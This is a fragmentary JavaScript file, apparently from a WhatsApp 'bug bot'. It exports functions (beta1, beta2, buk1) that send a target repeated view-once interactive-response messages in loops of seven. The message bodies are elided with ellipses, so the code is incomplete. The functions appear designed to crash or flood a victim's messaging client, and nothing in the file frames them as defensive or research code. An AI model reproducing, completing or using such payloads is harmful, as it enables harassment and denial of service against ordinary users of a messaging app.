exports.beta2 = async (drayyy, target) => {
    for (let i = 0; i < 7; i++) {
        await drayyy.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "Hello Im Hassan",
                                format: "EXTENSIONS_1"
                            },
...
exports.beta1 = async (drayyy, target) => {
    for (let i = 0; i < 7; i++) {
        await drayyy.relayMessage(target, 
            {
                viewOnceMessage: {
...
exports.buk1 = async (drayyy, target, text, amount, ptcp = false) => {
    await drayyy.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
